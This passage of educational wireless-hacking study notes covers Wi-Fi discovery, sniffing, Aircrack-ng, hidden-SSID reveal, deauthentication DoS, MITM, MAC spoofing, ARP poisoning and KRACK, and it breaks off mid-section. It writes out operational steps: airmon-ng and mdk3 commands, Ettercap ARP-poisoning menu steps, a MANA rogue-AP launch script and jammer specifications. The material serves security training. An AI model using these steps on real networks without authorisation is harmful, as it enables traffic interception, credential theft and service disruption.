				- Active Footprinting Method: In active footprinting, the attacker’s device sends a probe request with an SSID to an AP and waits for a response. If the SSID is unknown, the device can send a probe request with an empty SSID. Many APs respond with their SSID in a probe response packet, allowing the attacker to learn the SSID. Once the correct BSS is identified, the attacker can configure their device to interact with the AP while ignoring probe requests with empty SSIDs.
			- Attackers use wireless network scanning tools like NetSurveyor and Wi-Fi Scanner to scan for Wi-Fi networks. The SSID is present in beacon frames, probe requests and responses, and association/re-association requests. If an attacker cannot obtain the SSID through passive scanning, they may resort to active scanning. Once the SSID is identified, the attacker can connect to the wireless network and execute further attacks.
			- Wireless network scanning also enables sniffing, where an attacker tunes into various radio channels to capture network traffic.
		- Finding Wi-Fi Networks in Range to Attack:
			- The first step for an attacker targeting Wi-Fi networks is identifying potential networks within range to determine the best one to attack. Attackers use various Wi-Fi chalking techniques, such as WarWalking, WarChalking, WarFlying, and WarDriving, to locate vulnerable Wi-Fi networks.
			- Wi-Fi Chalking Techniques:
				- WarWalking: Attackers walk around with Wi-Fi-enabled laptops equipped with wireless discovery tools to map out open wireless networks.
				- WarChalking: Symbols are drawn in public places to indicate the presence of open Wi-Fi networks.
				- WarFlying: Attackers use drones to detect and map out open wireless networks.
				- WarDriving: Attackers drive around with Wi-Fi-enabled laptops running wireless discovery tools to identify open networks.
			- Tools Used for Wi-Fi Discovery:
				- Attackers utilize various tools to discover Wi-Fi networks for potential attacks, including:
				- A laptop with a Wi-Fi card
				- An external Wi-Fi antenna for extended range
				- Network discovery software
			- Some commonly used Wi-Fi network discovery tools include:
				- inSSIDer
				- NetSurveyor
				- Wi-Fi Scanner
				- Acrylic WiFi Heatmaps
		- Wi-Fi Discovery Tools:
			- inSSIDer (www.metageek.com):
				- inSSIDer is a Wi-Fi optimization and troubleshooting tool that scans for wireless networks using the user’s Wi-Fi adapter. It helps visualize signal strengths and network channels while providing useful details about each network. Attackers use inSSIDer to discover nearby Wi-Fi access points and devices.
				- Features:
					- Analyzes WLAN and surrounding networks to troubleshoot interference from competing APs.
					- Tracks received signal strength (measured in dBm) over time and filters APs.
					- Highlights APs in areas with high Wi-Fi congestion.
					- Exports Wi-Fi and GPS data to a KML file for viewing in Google Earth.
					- Identifies overlapping Wi-Fi network channels.
			- Sparrow-WiFi (github.com):
				- Sparrow-WiFi is a GUI-based tool for 2.4 GHz and 5 GHz Wi-Fi spectrum analysis. It enables attackers to integrate software-defined radio (HackRF), advanced Bluetooth tools (Ubertooth), and GPS tracking (via gpsd and mavlink) to discover Wi-Fi access points, identify SSIDs, perform source hunting, and conduct spectrum analysis.
				- Features:
					- Supports import/export in CSV and JSON formats.
					- Generates Google Maps visualizations for discovered devices.
					- Offers advanced Wi-Fi spectrum analysis and signal source tracking.
			- Wi-Fi Scanner (lizardsystems.com)
			- Acrylic WiFi Heatmaps (www.acrylicwifi.com)
			- WirelessMon (www.passmark.com)
			- Ekahau Wi-Fi Heatmaps (www.ekahau.com)
			- NetSpot (www.netspotapp.com)
			- AirMagnet® Survey PRO (www.netally.com)
		- Mobile-Based Wi-Fi Discovery Tools:
			- WiFi Analyzer (play.google.com): WiFi Analyzer is a Wi-Fi network optimization tool that helps users examine surrounding Wi-Fi networks, measure signal strengths, and identify congested channels. Attackers use WiFi Analyzer to detect nearby access points (APs), visualize channel signal strengths, and estimate distances to APs.
			- Opensignal (opensignal.com)
			- Network Signal Info Pro (www.kaibits-software.com)
			- Net Signal Pro:WiFi & 5G Meter (play.google.com)
			- NetSpot WiFi Analyzer (apps.apple.com)
			- WiFiman (play.google.com)
		- Finding WPS-Enabled APs:
			- Attackers use the Wash command-line utility to identify Wi-Fi Protected Setup (WPS)-enabled access points (APs) in a target wireless network. This utility also helps determine whether an AP is in a locked state.
			- Most WPS-enabled routers automatically lock after multiple failed authentication attempts (typically after five incorrect credential entries). Once locked, they can only be unlocked manually through the router’s administrator interface.
			- The Wash command supports 5 GHz channels and is available as part of the Reaver package.
	- Wireless Traffic Analysis:
		- The next step in the wireless hacking methodology is analyzing the traffic of a discovered wireless network. An attacker performs wireless traffic analysis before launching actual attacks. This analysis helps identify vulnerabilities, potential victims, and the best strategy for a successful attack. Various tools and techniques are used to analyze the target network’s traffic.
		- Wi-Fi protocols are unique to Layer 2, and traffic over the air is not serialized, making it easier to sniff and analyze wireless packets. Attackers analyze a wireless network to determine the broadcasted SSID, the presence of multiple access points (APs), the possibility of recovering SSIDs, the authentication method used, WLAN encryption algorithms, and more. To capture and analyze traffic, attackers use Wi-Fi packet sniffing tools such as AirMagnet™ G3 Pro, Wireshark, Riverbed Packet Analyzer, OmniPeek, and CommView for Wi-Fi.
		- Sniffing is a type of eavesdropping where attackers intercept ongoing wireless communication. They achieve this by tuning a receiver to the target transmission frequency and identifying the communication protocol in use. Captured traffic is then analyzed to launch further attacks on the network. To sniff wireless traffic, an attacker must enable monitor mode on their Wi-Fi card.
		- Not all Wi-Fi cards support monitor mode in Windows. You can check if your Wi-Fi card supports monitor mode at the following link: https://secwiki.org/w/Npcap/WiFi_adapters
		- Attackers use tools such as Wireshark, Riverbed Packet Analyzer, OmniPeek Network Protocol Analyzer, CommView for Wi-Fi, and Kismet to sniff wireless networks.
		- Wi-Fi Packet Sniffers:
			- Wireshark (www.wireshark.org):
				- Wireshark is a powerful network protocol sniffer and analyzer. It allows users to capture and interactively browse traffic in a target network. Wireshark can read live data from various network types, including:
					- Ethernet, Token Ring, and FDDI networks
					- Point-to-Point Protocol (PPP) and Serial Line Internet Protocol (SLIP) networks
					- 802.11 wireless LANs
					- Automated Teller Machine (ATM) connections (if the ATM’s OS permits Wireshark access)
					- Any device supported on Linux by recent versions of libpcap
				- Npcap is integrated with Wireshark for comprehensive WLAN traffic analysis, visualization, drill-down, and reporting. Attackers capture wireless traffic by enabling monitor mode in Wireshark, allowing them to collect management frames, control frames, data frames, and more. Wireshark also helps analyze Radiotap header fields, which reveal critical details such as protocols used, encryption techniques, frame lengths, and MAC addresses.
			- CommView for Wi-Fi (www.tamos.com):
				- CommView for Wi-Fi is a wireless network monitor and analyzer for 802.11 a/b/g/n networks. It captures packets and displays key information such as:
					- List of APs and stations
					- Per-node and per-channel statistics
					- Signal strength
					- List of packets and network connections
					- Protocol distribution charts
				- Users can decrypt packets using user-defined WPA-PSK keys and analyze them down to the lowest layer. The analyzer provides a tree-like structure to display protocol layers and packet headers, offering a detailed breakdown of captured packets.
			- Omnipeek® Network Protocol Analyzer (www.liveaction.com)
			- Kismet (www.kismetwireless.net)
			- SolarWinds Network Performance Monitor (www.solarwinds.com)
			- Acrylic Wi-Fi Analyzer (www.acrylicwifi.com)
			- airgeddon (github.com)
		- Choosing the Optimal Wi-Fi Card:
			- Selecting the right Wi-Fi card for hacking requires hardware that supports essential features for wireless network analysis. Choosing an optimal Wi-Fi card is crucial because tools such as Aircrack-ng and NetSpot work only with specific wireless chipsets. Attackers consider the following factors when selecting a Wi-Fi card:
			- Determine Wi-Fi Requirements:
				- An attacker may need to either listen to wireless network traffic or both listen to and inject packets.
					- Windows can listen to network traffic but cannot inject data packets.
					- Linux supports both listening and packet injection.
				- Based on these capabilities, the attacker selects the operating system (OS), hardware format (PCMCIA, USB), and required features (listening, injection, or both).
			- Learn the Capabilities of a Wireless Card:
				- Wi-Fi cards have two manufacturers:
					- The brand of the card (e.g., TP-Link, Alfa, Netgear)
					- The chipset manufacturer (e.g., Atheros, Broadcom, Realtek)
				- Knowing only the brand and model of the card is not enough. The chipset determines:
					- Supported operating systems
					- Required drivers
					- Capabilities and limitations
				- Most card manufacturers do not disclose chipset details, but this information is critical for selecting the right Wi-Fi card.
			- Determine the Chipset of the Wi-Fi Card:
				- Attackers can identify a Wi-Fi card’s chipset using the following methods:
					- Search online for model specifications.
					- Check Windows driver filenames, which often include the chipset name.
					- Visit the manufacturer’s website for detailed specifications.
					- Physically inspect the wireless chip, as some cards display the chipset number.
					- Use the Federal Communications Commission (FCC) ID Search to look up chipset details if the device has an FCC identification number.
				- Manufacturers sometimes change the chipset while keeping the same model number, labeling it as a "card revision" or "card version." Therefore, attackers must check the revision/version to ensure compatibility. The following site may provide compatibility information: https://wireless.wiki.kernel.org/en/users/Drivers
			- Verify the Chipset Capabilities:
				- Before selecting a Wi-Fi card, attackers must ensure the chipset:
					- Is compatible with the target OS
					- Supports the necessary features (monitor mode, packet injection, etc.)
				- Determine Required Drivers and Patches:
					- Attackers must identify:
						- The drivers needed for the chipset
						- Any OS patches required for proper functionality
					- After evaluating all these factors, the attacker selects a Wi-Fi card that uses the chosen chipset, referencing a compatible card list for guidance.
		- Performing Spectrum Analysis:
			- Attackers use spectrum analyzers to detect the presence of wireless networks. Spectrum analysis allows attackers to actively monitor spectrum usage in a specific area and identify signals from the target network. It also helps measure the signal strength of both known and unknown transmissions.
			- Spectrum analyzers use statistical analysis to:
				- Visualize spectrum usage
				- Assess "air quality"
				- Identify transmission sources
			- While RF technicians use spectrum analyzers to install and maintain wireless networks and diagnose interference, attackers leverage Wi-Fi spectrum analysis to detect wireless attacks, including:
				- Denial-of-Service (DoS) attacks
				- Authentication/encryption attacks
				- Network penetration attempts
			- The following are some automated tools used by attackers for spectrum analysis of target wireless networks.
			- RF Monitoring and Spectrum Analyzing Tools:
				- RF Explorer (rfexplorer.com):
					- RF Explorer is an RF spectrum analysis tool that can function as a standalone handheld device or connect to a PC for advanced data analysis.
					- It is widely used for:
						- Detecting and identifying RF interference sources
						- Monitoring wireless system health
						- Observing transmitted RF signals
					- RF Explorer provides a real-time view of the local RF environment, helping users identify RF transmissions that could be sources of interference.
				- Chanalyzer (www.metageek.com)
				- AirCheck G3 Pro (www.netally.com)
				- Spectraware S1000 (thinkrf.com)
				- RSA306B USB Spectrum Analyzer (www.tek.com)
				- RF Explorer 6G (j3.rf-explorer.com)
				- RFXpert (www.dektec.com)
				- Monics® 200 (www.kratosdefense.com)
				- Monics® satID® (www.kratosdefense.com)
				- Signal Hound (signalhound.com)
				- FieldSENSE (www.fieldsense.com)
	- Launch of Wireless Attacks:
		- After completing the discovery, mapping, and analysis of a target wireless network, an attacker is in a position to launch various types of attacks. These may include fragmentation attacks, MAC spoofing, Denial-of-Service (DoS) attacks, and Address Resolution Protocol (ARP) poisoning attacks. This section provides an overview of wireless attacks and how they are carried out.
		- Aircrack-ng Suite (www.aircrack-ng.org):
			- Aircrack-ng is a comprehensive software suite for wireless network security assessment. It includes tools for detecting networks, capturing packets, cracking WEP and WPA/WPA2-PSK encryption, and analyzing 802.11 wireless traffic. The suite is compatible with both Linux and Windows.
			- Key Components of Aircrack-ng Suite:
				- Airbase-ng : Captures WPA/WPA2 handshakes and can function as an ad-hoc access point (AP).
				- Aircrack-ng : The primary tool for cracking WEP and WPA/WPA2-PSK encryption.
				- Airdecap-ng : Decrypts WEP/WPA/WPA2-encrypted packets and removes wireless headers from Wi-Fi traffic.
				- Airdrop-ng : Performs targeted, rule-based deauthentication of users.
				- Aireplay-ng : Helps in gathering initialization vectors (IVs) for WEP cracking and capturing WPA handshakes for further security analysis.
				- Airgraph-ng : Generates client-to-AP relationship graphs and probe request maps using data from Airodump-ng.
				- Airmon-ng : Switches wireless network interfaces between managed and monitor modes.
				- Airodump-ng : Captures raw 802.11 frames and collects WEP IVs for analysis.
				- Airolib-ng : Manages and stores ESSID and password lists for WPA/WPA2 cracking.
				- Airtun-ng : Creates a virtual tunnel interface to monitor encrypted traffic and inject packets into a network.
		- Detection of Hidden SSIDs:
			- Many organizations attempt to enhance security by hiding the SSID of their wireless networks, relying on the principle of security through obscurity. This approach is often part of an organization's security policy, as attackers could potentially exploit SSIDs to breach wireless networks. However, hiding an SSID does not provide real security—an attacker can still uncover a hidden SSID using tools like Aircrack-ng and MDK3 by following these steps:
			- Steps to Reveal a Hidden SSID:
				- Enable monitor mode using Airmon-ng: airmon-ng start <Wireless Interface>
				- If any processes interfere, run the following command to kill them: airmon-ng check kill
				- Start Airodump-ng to monitor the wireless interface and discover SSIDs: airodump-ng <Wireless Interface>
				- The SSID of the target access point will appear as hidden in the scan results.
				- Use MDK3 to brute-force and retrieve the actual hidden SSID:
					- Open another terminal as root and execute: mdk3 <Wireless Interface> p -b 1 -c <Channel> -t <Target BSSID>
			- By executing these steps, an attacker can successfully reveal a hidden SSID, demonstrating why SSID hiding alone is not a reliable security measure. Instead, organizations should implement stronger security protocols such as WPA2/WPA3 encryption and MAC filtering to better protect their networks.
		- Denial-of-Service (DoS) Attacks on Wireless Networks:
			- Wireless networks are particularly vulnerable to Denial-of-Service (DoS) attacks due to the interactions among the physical, data-link, and network layers. These networks operate in unlicensed frequency bands, transmitting data via radio signals. While the MAC protocol was designed for simplicity, it is inherently susceptible to DoS attacks.
			- Many WLANs support mission-critical applications such as VoIP, database access, project data files, and Internet services. A DoS attack can easily disrupt these applications, leading to network downtime and loss of productivity.
			- How Wireless DoS Attacks Work: Wireless DoS attacks disrupt network connectivity by broadcasting de-authentication or disassociation commands. These forged transmissions force clients to disconnect from the access point (AP), effectively denying them access to the network.
			- Types of Wireless DoS Attacks:
				- Disassociation Attack: In a disassociation attack, the attacker severs the connection between the AP and client, rendering the victim's device unable to communicate with other wireless devices.
				- De-authentication Attack: In a de-authentication attack, the attacker floods the network with forged de-authentication or disassociation frames, forcing clients to disconnect from the AP repeatedly.
			- These attacks exploit weaknesses in the 802.11 protocol, which does not authenticate management frames, making them an easy target for attackers. Effective countermeasures include management frame protection (MFP), WPA3, intrusion detection systems (IDS), and network segmentation.
		- Man-in-the-Middle (MITM) Attack:
			- A man-in-the-middle (MITM) attack is an active internet attack in which an attacker intercepts, reads, or alters information transmitted between two computers. MITM attacks can occur in both 802.11 WLANs and wired communication systems.
			- Eavesdropping:
				- Eavesdropping is particularly easy in wireless networks because they lack a physical communication medium. An attacker within range of a wireless network can capture radio waves with minimal effort and equipment. Additionally, the attacker can inspect entire data frames transmitted across the network or store them for later analysis.
				- To prevent attackers from accessing sensitive information, multiple layers of encryption should be implemented. WEP or data-link encryption can be applied at lower levels, while security mechanisms like IPsec, SSH, or SSL should be used for additional protection. Without these measures, transmitted data may be exposed to attackers. However, as previously demonstrated, WEP encryption can be cracked using freely available tools on the internet.
				- Accessing email via Post Office Protocol (POP) or Internet Message Access Protocol (IMAP) is particularly risky, as these protocols transmit emails over wireless networks without additional encryption. A skilled hacker can log gigabytes of WEP-protected traffic, analyze the data, and ultimately break the encryption.
			- Manipulation:
				- Manipulation goes beyond eavesdropping. In this attack, an attacker captures the victim’s encrypted data, modifies it, and retransmits the altered data to the intended recipient. Additionally, an attacker can intercept packets, change their destination address, and forward them across the internet.
				- MITM Attack Execution Steps:
					- An attacker carries out an MITM attack through the following steps:
					- The attacker sniffs the victim’s wireless parameters (MAC address, ESSID/BSSID, and channel number).
					- The attacker sends a DEAUTH request to the victim, spoofing the source address of the victim’s Access Point (AP).
					- Upon receiving the request, the victim’s device is deauthenticated and begins scanning all channels for a new valid AP.
					- The attacker sets up a forged AP on a new channel, using the original MAC address (BSSID) and ESSID of the victim’s AP, tricking the victim into connecting to the rogue AP.
					- Once the victim successfully connects to the forged AP, the attacker spoofs the victim’s connection to the original AP.
					- The attacker is now positioned between the AP and the victim, intercepting and monitoring all network traffic.
		- MITM Attack Using Aircrack-ng:
			- An attacker can perform a Man-in-the-Middle (MITM) attack using Aircrack-ng by following these steps:
				- Enable monitor mode using airmon-ng.
				- Use airodump-ng to discover SSIDs on the interface.
				- Deauthenticate (deauth) the client using aireplay-ng.
				- Associate the wireless card (fake association) with the target access point (AP) using aireplay-ng.
		- MAC Spoofing Attack:
			- AP MAC Spoofing:
				- In wireless networks, access points (APs) use beacon frames to advertise their presence and availability. These beacons contain information such as the AP's MAC address and the network SSID. Clients in the vicinity use this information to connect to the network.
				- Many software tools and APs allow users to configure custom MAC addresses and SSIDs. Attackers exploit this capability through AP MAC spoofing, a technique where they impersonate a legitimate AP by changing their MAC address to match that of a trusted AP.
				- Steps in AP MAC Spoofing Attack:
					- The attacker identifies the MAC address of a legitimate AP by monitoring network traffic or scanning available wireless networks.
					- The attacker configures a rogue AP with the same MAC address and SSID as the legitimate AP.
					- The attacker may send deauthentication packets to disconnect users from the real AP, forcing their devices to reconnect to the closest AP with the same MAC address and SSID—often the rogue AP.
					- Once users connect to the rogue AP, the attacker can intercept, manipulate, or redirect their network traffic to capture sensitive information or launch further attacks.
			- MAC Spoofing Attack:
				- A MAC address is a unique identifier assigned to a network interface card (NIC) by the manufacturer. Some networks use MAC address filtering as a security measure to allow only specific devices to connect.
				- In MAC spoofing, attackers change their MAC address to impersonate an authenticated user and bypass MAC filtering.
				- Steps in MAC Spoofing:
					- The attacker changes their MAC address to another valid one, using a hexadecimal format (e.g., AA:BB:CC:DD:EE:FF).
					- This change is made using commands such as ifconfig or ip link set, often requiring root privileges (sudo).
					- Attackers use specialized tools to automate and simplify the MAC spoofing process.
			- MAC Spoofing Tools:
				- Technitium MAC Address Changer (technitium.com): This tool allows users to instantly change (spoof) the MAC address of their NIC. It features a user-friendly interface and provides details about each NIC in the system. The MAC address is used by Windows drivers for Ethernet LAN communication.
				- LizardSystems Change MAC Address: A tool that enables users to change their MAC address easily. It provides an intuitive interface and supports quick modifications for network anonymity and security testing.
		- Wireless ARP Poisoning Attack:
			- Address Resolution Protocol (ARP) is responsible for determining the MAC address of an access point (AP) if its IP address is already known. However, ARP lacks a mechanism to verify whether the responses come from legitimate hosts. ARP poisoning is an attack technique that exploits this vulnerability by corrupting the ARP cache maintained by the operating system with incorrect MAC address mappings.
			- How ARP Poisoning Works:
				- An attacker sends a forged ARP reply packet containing an incorrect MAC address.
				- This causes devices on the network to update their ARP cache with the false MAC address.
				- As a result, all traffic intended for a legitimate device is redirected to the attacker's system.
			- Impact of ARP Poisoning:
				- The attack affects all hosts within the same subnet since most APs function as transparent MAC-layer bridges.
				- If an AP is directly connected to a switch or hub without a router or firewall in between, all devices on that switch or hub are vulnerable to ARP poisoning attacks.
			- Wireless ARP Spoofing Attack Example:
				- In a wireless ARP spoofing attack, the attacker first spoofs the MAC address of the victim's device and attempts to authenticate to Access Point 1 (AP1) using an ARP poisoning tool such as arpspoof.
					- AP1 then propagates the attacker's spoofed MAC address to network routers and switches.
					- These devices update their routing and switching tables with the incorrect information.
					- As a result, traffic from the network backbone, which was originally intended for the victim's system, is redirected to AP1 instead of Access Point 2 (AP2).
			- ARP Poisoning Attack Using Ettercap (www.ettercap-project.org):
				- Attackers use Ettercap to identify the MAC addresses of clients and routers, enabling various attacks such as ARP poisoning, packet sniffing, and Man-in-the-Middle (MITM) attacks. With this tool, an attacker can intercept and analyze a victim’s network traffic.
				- Steps to Perform an ARP Poisoning Attack Using Ettercap:
					- Launch Ettercap and enable unified sniffing:
						- Open the Ettercap graphical interface.
						- Select Sniff -> Unified Sniffing from the menu bar.
						- This bridges the connection and allows traffic sniffing across interfaces.
					- Set the primary sniffing interface:
						- In the Ettercap Setup pop-up window, choose the primary interface for sniffing.
						- Click OK to enable advanced menu options such as Targets, Hosts, MITM, and Plugins.
					- Scan the network for live hosts:
						- Select Hosts -> Scan for Hosts to identify all active devices on the network.
						- To view the discovered hosts, select Hosts -> Hosts List.
					- Monitor network connections:
						- Select View -> Connections to start snooping on identified network traffic.
						- The Connections view allows filtering based on IP address, connection type, and state (open/closed/active/killed).
					- Select target hosts for ARP spoofing:
						- In the Hosts window, choose the target IP address.
						- Select Targets -> Current Targets to add the identified hosts for ARP spoofing.
					- Launch the ARP poisoning attack:
						- Select MITM -> ARP Poisoning.
						- In the pop-up window, check Sniff remote connections and click OK to begin the attack.
				- Post-Attack Consequences:
					- Once the attack is launched, the attacker can intercept the target’s network traffic. If the victim accesses a website without Hypertext Transfer Protocol Secure (HTTPS) encryption, their login credentials and sensitive data can be easily sniffed.
		- Rogue APs:
			- Rogue AP Attack:
				- Access Points (APs) connect to client Network Interface Cards (NICs) by authenticating with the help of Service Set Identifiers (SSIDs). Unauthorized (or rogue) APs can allow anyone with an 802.11-enabled device to connect to a corporate network. This unauthorized access can give an attacker entry into the network.
				- Using wireless sniffing tools, attackers can gather critical information from APs, such as authorized MAC addresses, vendor details, and security configurations. With this information, an attacker can compile a list of authorized AP MAC addresses on the target LAN and compare it with the MAC addresses detected through sniffing. After cross-checking, the attacker can create a rogue AP and position it near the target corporate network.
				- Attackers use rogue APs within an 802.11 network to hijack connections from legitimate network users. When a user powers on their device, the rogue AP broadcasts an SSID to lure the user into connecting. If the user mistakenly connects to the rogue AP, all their traffic is routed through it, enabling the attacker to perform wireless packet sniffing. These intercepted packets may contain sensitive information such as usernames and passwords.
				- Rogue APs are unauthorized wireless APs installed by attackers without the knowledge or approval of network administrators. Unlike authorized APs, rogue APs are often unconfigured for security, potentially providing a backdoor into the target wireless network.
				- Common Rogue AP Installation Scenarios:
					- Compact, pocket-sized rogue AP plugged into an Ethernet port of the target network:
						- Small, easily concealed rogue APs can be discreetly brought onsite and plugged into an available Ethernet port. They require minimal power and are difficult to detect.
					- Rogue AP connected to corporate networks over a Wi-Fi link:
						- The attacker connects a rogue AP wirelessly to an existing authorized network. This method avoids the need for a physical connection but requires valid credentials for network access.
					- USB-based rogue AP plugged into a network machine:
						- A rogue AP can be deployed via a USB device plugged into any Windows machine connected to the corporate network. The rogue AP's software shares the machine’s network access, bypassing the need for an open Ethernet port or valid Wi-Fi credentials.
					- Software-based rogue AP running on a networked Windows machine:
						- Instead of using separate hardware, an attacker can create a software-based rogue AP on a compromised Windows machine with an embedded or plugged-in Wi-Fi adapter.
				- Steps to Deploy a Rogue AP:
					- Select an optimal location to plug in the rogue AP for maximum coverage.
					- Disable SSID broadcasting (silent mode) and management features to reduce detection.
					- Position the rogue AP behind a firewall if possible, to avoid detection by network scanners.
					- Limit deployment duration to minimize the risk of discovery.
			- Creating a Rogue AP Using the MANA Toolkit:
				- The MANA Toolkit is a set of tools used by attackers to create rogue Access Points (APs), perform sniffing attacks, and execute Man-in-the-Middle (MITM) attacks. It is also capable of bypassing HTTPS and HTTP Strict Transport Security (HSTS) protections.
				- Attackers can use the MANA Toolkit to create a rogue AP by following these steps:
					- Modify MANA’s configuration file (hostapd-mana.conf):
						- Use any text editor to configure a fake access point.
						- Set the wireless interface (e.g., wlan0) and define the MAC address (BSSID) or SSID (e.g., "Free Internet").
					- Modify the script file (start-nat-simple.sh):
						- This script is used to launch the rogue AP.
						- Set the wireless card parameter (phy), such as wlan0.
						- Define the upstream parameter (e.g., eth0), specifying the interface that provides an internet connection.
					- Execute the script to start the rogue AP:
						- Run the following command in the terminal: bash <Path to MANA>/mana-toolkit/run-mana/start-nat-simple.sh
						- This command initializes the rogue AP.
					- Connect a client device to the rogue AP:
						- Use a Windows machine, mobile device, or any other Wi-Fi-enabled device to connect.
						- Search for the rogue AP (e.g., "Free Internet") in the list of available networks.
						- Since the rogue AP is open (no password required), users may unknowingly connect.
					- Intercept and analyze network traffic:
						- Once a device connects to the rogue AP, all its data packets flow through the attacker's system.
						- Use packet sniffing tools such as tcpdump or Wireshark to capture and analyze network traffic.
		- Evil Twin:
			- An evil twin is a rogue wireless access point (AP) that masquerades as a legitimate AP by imitating its SSID. It poses a significant threat to wireless users on both private and public WLANs. Attackers set up these rogue APs outside network perimeters to lure users into connecting. Tools like KARMA enable attackers to create evil twins by monitoring station probes. The KARMA tool passively listens to wireless probe request frames and can mimic commonly used SSIDs to deceive users.
			- An attacker can configure an evil twin with a commonly used residential SSID, a public hotspot SSID, or an organization’s WLAN SSID. If attackers can monitor legitimate users, they can target APs that do not broadcast SSIDs in probe requests. WLAN stations typically connect to APs based on SSID and signal strength, and they automatically reconnect to previously used SSIDs. This behavior allows attackers to trick users by positioning an evil twin near the target network. Once a user connects, the attacker can bypass enterprise security policies and intercept network data.
			- Employees who take their corporate laptops to public Wi-Fi networks face an increased risk of such attacks, making it challenging to secure company data.
			- Setting Up Fake Hotspot (Evil Twin):
				- Not all hotspots in an area are legitimate—an attacker may set up an evil twin that pretends to be a real hotspot. Differentiating between a legitimate hotspot and an evil twin can be difficult. For instance, if a user sees two APs with the same SSID, one may be genuine while the other is malicious. If the user connects to the fake AP, the attacker can capture login credentials and gain access to the victim’s device. Since login attempts on the fake network may fail, the user may assume the failure was random and retry, unknowingly exposing their credentials.
				- An attacker can create a fake hotspot using a laptop with an internet connection (via 3G, 4G, or a wired connection) and a small access point.
				- The process involves:
					- Enabling Internet Connection Sharing in Windows or Internet Sharing in macOS.
					- Broadcasting a Wi-Fi signal and running a packet-sniffing program to capture passwords.
		- Key Reinstallation Attack (KRACK):
			- A Key Reinstallation Attack (KRACK) exploits vulnerabilities in the implementation of the four-way handshake process of the WPA2 authentication protocol, which is used to establish a secure connection between a device and an access point (AP). All secure Wi-Fi networks rely on this handshake to generate a fresh encryption key for encrypting network traffic.
			- KRACK works by forcing the reuse of a cryptographic Nonce, a number used only once in encryption. In this attack, the attacker captures the victim’s ANonce key (Authenticator Nonce) and manipulates or replays cryptographic handshake messages. This allows the attacker to compromise the encryption process and gain unauthorized access to network traffic.
			- This attack affects all modern protected Wi-Fi networks, including both WPA and WPA2, across personal and enterprise networks. It impacts encryption ciphers such as WPA-TKIP, AES-CCMP, and GCMP. By exploiting this flaw, attackers can steal sensitive information such as credit card numbers, passwords, chat messages, emails, and photos.
			- Devices running Android, Linux, Windows, Apple, OpenBSD, and MediaTek are vulnerable to various forms of the KRACK attack.
		- Jamming Signal Attack:
			- Jamming is an attack on a wireless network designed to disrupt its functionality. In this type of exploitation, overwhelming volumes of malicious traffic result in a denial of service (DoS) for authorized users, obstructing legitimate communication. All wireless networks are vulnerable to jamming, and spectrum jamming attacks can completely block all communications.
			- Attackers use specialized hardware to carry out this kind of attack. The signals generated by jamming devices appear as noise to the devices on the wireless network, causing them to halt their transmissions until the interference subsides—ultimately leading to a DoS. Additionally, jamming signal attacks are difficult to detect.
			- The process of a jamming signal attack is summarized as follows:
				- The attacker positions themselves near the target area and uses a high-gain amplifier to overpower a legitimate access point (AP).
				- Users are unable to log in or are disconnected due to the overpowering nearby signal.
				- The jamming signal causes a DoS because 802.11 uses the Carrier Sense Multiple Access with Collision Avoidance (CSMA/CA) protocol, which requires a period of silence before a device can transmit. The jamming signal prevents this silence, effectively blocking communication.
			- Wi-Fi Jamming Devices:
				- An attacker can jam a wireless network using a Wi-Fi jammer. These devices operate on the same frequency bands as the targeted network, causing interference with legitimate signals and temporarily disrupting network services.
				- Examples of Wi-Fi jamming devices:
					- PCB-4510 Jammer
						- Range: 50–150 m
						- Antennas: 10
						- Frequency Bands Jammed: GSM, 3G, UMTS, 4G LTE, Wi-Fi 11.b & g, GPS, 5G, Wi-Fi 11.a
						- Working Time: 1–2 hours
					- CPB-2920 Jammer
						- Range: 10–40 m
						- Antennas: 20
						- Frequency Bands Jammed: CDMA, DCS, PCS, 3G, UMTS, 4G, Wi-Fi 11.b & g, 4G WiMAX Sprint, 5G, GPS, Lojack, VHF, Car Remote, UHF
						- Working Time: No time limit
					- CPB-2612H-5G Jammer
						- Range: 20–60 m
						- Antennas: 12
						- Frequency Bands Jammed: 5G, 4G, GSM, DCS, 3G, UMTS, Wi-Fi 11.b & g, Lojack Car Tracking, UHF, VHF
						- Working Time: No time limit
					- CPB-2080-5G Jammer
						- Range: 10–40 m
						- Antennas: 8
						- Frequency Bands Jammed: 5G, 4G, GSM900, DCS, 3G, UMTS, Wi-Fi 11.b & g
						- Working Time: No time limit
					- PCB-2112 Jammer
						- Range: 20–50 m
						- Antennas: 12
						- Frequency Bands Jammed: CDMA, DCS, 3G, Wi-Fi 11.a, 4G, 5G, GPS, VHF, UHF
						- Working Time: 60–80 minutes
					- PCB-1016 Jammer
						- Range: 10–30 m
						- Antennas: 16
						- Frequency Bands Jammed: CDMA, DCS, PCS, 3G, UMTS, 4G, 5G, Wi-Fi 11.b & g, 4G WiMAX Sprint, GPS, UHF Remote Control, 5G LTE
						- Working Time: 3 hours
		- aLTEr Attack:
			- Long-Term Evolution (LTE), or 4G, is a wireless broadband communication standard developed as a successor to 3G to improve the speed and security of mobile networks. It features bandwidth scalability and supports previous technologies such as the Global System for Mobile Communications (GSM; 2G) and the Universal Mobile Telecommunications System (UMTS; 3G). Although LTE is designed to address the shortcomings of wireless networks, it remains vulnerable to data hijacking attacks.
			- The aLTEr attack is typically performed on LTE devices that encrypt user data using the AES counter (AES-CTR) mode, which lacks integrity protection. To execute this attack, an attacker sets up a rogue communication tower between two legitimate endpoints to mislead the victim. This fake tower intercepts data transmission between the user and the real tower, allowing the attacker to hijack an active session. Upon receiving the user’s request, the attacker manipulates the traffic and redirects the victim to malicious websites.
			- This attack occurs on Layer 2, also known as the data link layer, which is responsible for transmitting information through wireless networks using standard encryption technologies. This layer enables multiple users to access network resources and defines how data is transferred between two nodes. By exploiting vulnerabilities or design flaws in this layer, the attacker can take control of browsing data and modify user inputs using a spoofed DNS server, ultimately redirecting the user to unintended or harmful websites.
			- Steps in an aLTEr Attack:
				- The attacker installs a rogue tower that masquerades as a legitimate one.
				- The attacker determines the user’s position and sends a spoofed packet that appears as a valid request to the real tower.
				- The real tower responds with the requested web link.
				- The attacker manipulates the response and connects the user to an unwanted or harmful website.
			- Phases of an aLTEr Attack:
				- Information Gathering Phase:
					- Attackers passively gather the information required to execute an aLTEr attack using techniques such as identity mapping and website fingerprinting. They eavesdrop on the websites users attempt to access and track their browsing habits. However, at this stage, attackers do not modify any credentials or transmitted data.
					- Techniques used in this phase:
						- Identity mapping: The attacker maps the identity of the target device. Once the target is identified, the attacker prepares for the next phase.
						- Website fingerprinting: The attacker monitors the volume of traffic the user generates, tracks online activities, and collects metadata.
				- Attack Phase:
